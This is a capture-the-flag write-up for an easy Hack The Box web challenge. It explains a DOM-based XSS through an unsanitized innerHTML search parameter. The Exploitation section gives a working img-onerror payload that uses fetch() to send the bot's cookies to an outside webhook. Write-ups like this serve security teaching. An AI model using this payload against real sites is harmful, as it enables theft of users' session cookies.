---
title: "Paid Forms — HTB Morocco Meetups Summer CTF Cup (Web Easy)"
published: 2026-09-06
description: "Writeup for the Paid Forms challenge from the Hack The Box Morocco Meetups Summer CTF Cup. DOM-based XSS via a reflected search parameter leads to cookie theft through a headless browser bot."
image: ""
tags: [HackTheBox, CTF, Web, Easy, XSS, DOM-XSS, Cookie-Theft, JavaScript]
category: Writeups
draft: false
---

## Challenge Info

| Field      | Value                                |
|------------|--------------------------------------|
| Event      | HTB Morocco Meetups Summer CTF Cup   |
| Category   | Web                                  |
| Difficulty | Easy                                 |
| Objective  | Steal the flag from the bot's cookie |

---

## Overview

**Paid Forms** is an easy web challenge centered around **DOM-based XSS**. The application reflects user input from the URL's `search` query parameter directly into the DOM without sanitization, and there is a headless browser bot that visits submitted URLs with a session cookie containing the flag. The goal is to inject a JavaScript payload that exfiltrates the bot's cookie to an attacker-controlled server.

**Topics covered:**
- DOM-based XSS via `innerHTML` injection
- Bypassing `<script>` tag restrictions using `<img onerror>`
- Cookie theft via `fetch()` to a webhook
- Headless browser bots (Puppeteer)

---

## Reconnaissance

At first glance, the application has a search field. Testing it reveals that whatever we type is reflected back onto the page — a classic sign of a potential injection point.

Testing for **HTML injection** confirms the input is rendered as raw HTML:

![HTML injection test — the browser renders the injected markup](/assets/images/writeups/htb-ma-ctf/paid-forms/image-1.png)

Injecting a `<script>` tag doesn't execute (likely stripped or blocked), but an `<img>` tag with an `onerror` event handler works:

```html
<img src=x onerror=alert(1)>
```

![XSS alert box triggered via img onerror](/assets/images/writeups/htb-ma-ctf/paid-forms/image-2.png)

This confirms we have **JavaScript execution** in the context of the page.

---

## Source Code Analysis

### The Bot

The challenge provides a bot script that simulates an admin visiting submitted post URLs:

```js
const visitPost = async (id) => {
    try {
        const browser = await puppeteer.launch(browser_options);
        let context = await browser.createIncognitoBrowserContext();
        let page = await context.newPage();
        await page.setCookie({
            name: "flag",
            value: 'HTB{f4k3_fl4g_f0r_t3st1ng}',
            domain: "127.0.0.1:1337"
        });
        await page.goto(`http://127.0.0.1:1337/posts/${id}`, {
            waitUntil: 'networkidle2',
            timeout: 5000
        });
        await browser.close();
    } catch(e) {
        console.log(e);
    }
};
```

Key observations:
- The bot sets a `flag` cookie on the domain before visiting the page.
- The cookie is **not `HttpOnly`**, which means it is accessible via `document.cookie` in JavaScript.
- The bot visits `/posts/${id}` where `id` is attacker-controlled — meaning we control what URL the bot visits, including any query parameters appended after the post ID.

### The Vulnerable Sink

In `forum.js`, the application reads the `search` query parameter and injects it directly into the DOM:

```js
$('#search-msg').innerHTML = `Search results for "${params.search}" :`;
```

The value of `params.search` is placed inside `innerHTML` **without any sanitization**, making this a textbook DOM XSS sink. By crafting a URL like `/posts/1?search=<our_payload>`, the bot will render our injected HTML when it visits the page.

---

## Exploitation

### Strategy

1. Craft a URL that points to an existing post (`/posts/1`) with our XSS payload in the `search` parameter.
2. The XSS payload uses `<img onerror>` to run JavaScript that reads `document.cookie` and sends it to a webhook we control.
3. Submit this URL to the bot report functionality so the bot visits it.
4. Receive the flag on our webhook.

### Payload

```
1?search=<img src=x onerror="fetch('https://webhook.site/047da6b4-53a7-4f1e-bfdc-808372a2281e?c='+encodeURIComponent(document.cookie))">
```

- `src=x` — forces the browser to attempt loading a nonexistent image, which immediately triggers `onerror`.
- `fetch(...)` — sends the cookie as a query parameter to our webhook.
- `encodeURIComponent(document.cookie)` — URL-encodes the cookie value so special characters like `{`, `}`, `=` don't break the request.

### Sending to the Bot

We submit the crafted URL to the report/bot endpoint:

![Submitting the payload URL to the bot](/assets/images/writeups/htb-ma-ctf/paid-forms/image-3.png)

The bot visits the page, the XSS fires, and our webhook receives the request with the cookie:

![Webhook receives the flag cookie](/assets/images/writeups/htb-ma-ctf/paid-forms/image-4.png)

---

## Flag

```
HTB{d0m_x55_f0r_th3_w1n}
```
